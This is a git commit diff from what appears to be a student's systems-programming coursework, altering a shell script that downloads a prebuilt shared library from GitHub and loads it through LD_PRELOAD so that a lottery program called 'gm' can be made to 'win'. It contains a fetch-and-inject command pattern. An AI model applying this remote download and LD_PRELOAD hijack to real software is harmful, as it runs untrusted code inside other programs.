3b8848d81587adcb83e400eb4f346f71d0b4fe03
BekaHabesha <bereketdm1984@gmail.com>
2023-11-14 07:59:49 -0800

    101-make_me_win.sh - 3. Code injection: Win the Giga Millions./gm 9 8 10 24 75 9

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://raw.githubusercontent.com/BekaHabesha/alx-low_level_programming/main/0x18-dynamic_libraries/hacked.so
+wget -P .. https://raw.github.com/BekaHabesha/alx-low_level_programming/main/0x18-dynamic_libraries/hacked.so
 export LD_PRELOAD="$PWD/../hacked.so"
